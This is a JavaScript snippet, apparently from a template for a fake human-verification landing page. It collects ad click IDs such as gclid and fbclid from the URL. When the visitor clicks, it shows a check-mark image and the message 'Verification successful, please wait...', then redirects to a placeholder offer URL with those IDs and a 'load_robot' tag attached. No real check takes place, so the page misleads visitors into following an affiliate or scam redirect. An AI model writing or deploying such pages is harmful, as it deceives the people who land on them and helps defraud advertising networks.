  var btn1 = document.getElementById("btn1");
	var btn1Img = document.getElementById("btn1Img");
	var titleElement = document.getElementById("title");
	var checkImg = "https://cdn.jsdelivr.net/gh/KmCiq7e/5aGZRa/img/checkImg.webp";

    document.addEventListener("DOMContentLoaded", function() {
        var params = new URLSearchParams(window.location.search);
        var code = params.get("gclid") || params.get('gbraid') || params.get('wbraid') || params.get('msclkid') || params.get('fbclid');
        var url = "📌📌📌📌";

        if (code) {
            var separator = url.indexOf("?") !== -1 ? "&" : "?";
            url += separator + "sub1=" + encodeURIComponent(code) + "&sub2=📌acc_offer_country📌&sub3=load_robot";
        }	

        function red() {
			btn1Img.src = checkImg;
			setTimeout(() => {
				titleElement.textContent = "Verification successful, please wait...";
			}, 400);
			window.location.href = url;
        }

        btn1.addEventListener("click", red, { once: true });
    });
